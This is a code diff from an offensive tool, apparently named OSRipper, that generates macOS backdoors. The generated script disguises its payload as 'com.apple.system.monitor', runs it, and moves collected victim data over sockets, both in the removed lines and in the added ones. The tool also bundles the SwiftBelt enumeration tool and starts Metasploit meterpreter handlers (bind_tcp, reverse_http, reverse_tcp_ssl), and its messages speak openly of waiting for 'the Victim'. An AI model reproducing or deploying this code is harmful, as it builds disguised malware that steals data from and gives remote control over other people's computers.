@@ -395,11 +395,9 @@ def rep_syst():
         with open(name2, 'a+') as hider:
             hider.write(str('host = "'+host+'"\n'))
             v= '''
-from ast import AnnAssign
 import os
 import shutil
 import time
-from unicodedata import name
 directory_path = os.getcwd()
 folder_name = os.path.basename(directory_path)
 anan= __file__
@@ -412,115 +410,90 @@ dest='/Users/Shared/com.apple.system.monitor'
 shutil.copyfile(src, dest)
 shutil.copy(src1, dest1)
 os.system('chmod u+x '+dest1)
-os.system(dest1+' > output.txt')
+os.system(dest1+' > /users/shared/output.txt')
 time.sleep(10)
 import socket
-import tqdm
-import os
-import argparse
+import time
 
-SEPARATOR = "<SEPARATOR>"
-BUFFER_SIZE = 1024 * 4 #4KB
-try:
+TCP_IP = 'localhost'
+TCP_PORT = 9001
+BUFFER_SIZE = 1024
 
-    def send_file(filename, host, port):
-        # get the file size
-        filesize = os.path.getsize(filename)
-        # create the client socket
-        s = socket.socket()
-        print(f"[+] Connecting to {host}:{port}")
-        s.connect((host, port))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TCP_IP, TCP_PORT))
+recived_f = '/users/shared/output.txt'
+with open(recived_f, 'wb') as f:
+    print('file opened')
+    while True:
+        #print('receiving data...')
+        data = s.recv(BUFFER_SIZE)
+        print('data=%s', (data))
+        if not data:
+            f.close()
+            print('file close()')
+            break
+        # write data to a file
+        f.write(data)
 
-        # send the filename and filesize
-        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
-
-        # start sending the file
-        progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-        with open(filename, "rb") as f:
-            while True:
-                # read the bytes from the file
-                bytes_read = f.read(BUFFER_SIZE)
-                if not bytes_read:
-                    # file transmitting is done
-                    break
-                # we use sendall to assure transimission in 
-                # busy networks
-                s.sendall(bytes_read)
-                # update the progress bar
-                progress.update(len(bytes_read))
-
-        # close the socket
-        s.close()
-
-    if __name__ == "__main__":
-
-        filename = 'output.txt'
-        host = str(host)
-        port = 5002
-        send_file(filename, host, port)
-except(ConnectionRefusedError):
-    pass
+print('Successfully get the file')
+s.close()
+print('connection closed')
 os.system('chmod u+x '+dest)
 os.system(dest)
 
             '''
             hider.write(v)
             hider.close()
-            os.system('sudo pyinstaller --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "dist/ocr_or:ocr" --windowed '+str(name2))
+            os.system('sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "dist/ocr_or:ocr" '+str(name2))
 def server():
     import socket
-    import tqdm
-    import os
+    from threading import Thread
 
-    # device's IP address
-    SERVER_HOST = "0.0.0.0"
-    SERVER_PORT = 5002
-    # receive 4096 bytes each time
-    BUFFER_SIZE = 4096
-    SEPARATOR = "<SEPARATOR>"
-    # create the server socket
-    # TCP socket
-    s = socket.socket()
-    # bind the socket to our local address
-    s.bind((SERVER_HOST, SERVER_PORT))
-    # enabling our server to accept connections
-    # 5 here is the number of unaccepted connections that
-    # the system will allow before refusing new connections
-    s.listen(5)
-    print(f"[*] Waiting for the Victim to run the backdoor")
-    # accept connection if there is any
-    client_socket, address = s.accept() 
-    # if below code is executed, that means the sender is connected
-    print(f"[+] {address} is connected.")
+    TCP_IP = 'localhost'
+    TCP_PORT = 9001
+    BUFFER_SIZE = 1024
 
-    # receive the file infos
-    # receive using client socket, not server socket
-    received = client_socket.recv(BUFFER_SIZE).decode()
-    filename, filesize = received.split(SEPARATOR)
-    # remove absolute path if there is
-    filename = os.path.basename(filename)
-    # convert to integer
-    filesize = int(filesize)
-    # start receiving the file from the socket
-    # and writing to the file stream
-    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-    with open(filename, "wb") as f:
-        while True:
-            # read 1024 bytes from the socket (receive)
-            bytes_read = client_socket.recv(BUFFER_SIZE)
-            if not bytes_read:    
-                # nothing is received
-                # file transmitting is done
-                break
-            # write to the file the bytes we just received
-            f.write(bytes_read)
-            # update the progress bar
-            progress.update(len(bytes_read))
 
-    # close the client socket
-    client_socket.close()
-    # close the server socket
-    s.close()
+    class ClientThread(Thread):
+
+        def __init__(self, ip, port, sock):
+            Thread.__init__(self)
+            self.ip = ip
+            self.port = port
+            self.sock = sock
+            print(" New thread started for "+ip+":"+str(port))
+
+        def run(self):
+            filename = 'output.txt'
+            f = open(filename, 'rb')
+            while True:
+                l = f.read(BUFFER_SIZE)
+                while (l):
+                    self.sock.send(l)
+                    #print('Sent ',repr(l))
+                    l = f.read(BUFFER_SIZE)
+                if not l:
+                    f.close()
+                    self.sock.close()
+                    break
+
+
+    tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    tcpsock.bind((TCP_IP, TCP_PORT))
+    threads = []
+
+    while True:
+        tcpsock.listen(5)
+        print("Waiting for incoming connections...")
+        (conn, (ip, port)) = tcpsock.accept()
+        print('Got connection from ', (ip, port))
+        newthread = ClientThread(ip, port, conn)
+        newthread.start()
+        threads.append(newthread)
+
+    for t in threads:
+        t.join()
 def cleanup():
     try:
         os.remove(os.getcwd()+'/dist/ocr_or')
@@ -559,7 +532,7 @@ if nscan == "1":
     print('Generated in dist')
     print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
     print('After that the listener will spawn instantly')
-    server()
+    #server()
     port=input('Please enter the port you want to listen on: ')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/bind_tcp;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
@@ -576,7 +549,7 @@ if nscan == "3":
     print('Generated in dist')
     print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
     print('After that the listener will spawn instantly')
-    server()
+    #server()
     port=input('Please enter the port you want to listen on: ')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_http;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
@@ -589,7 +562,7 @@ if nscan == "4":
     print('Generated in dist')
     print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
     print('After that the listener will spawn instantly')
-    server()
+    #server()
     port=input('Please enter the port you want to listen on: ')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
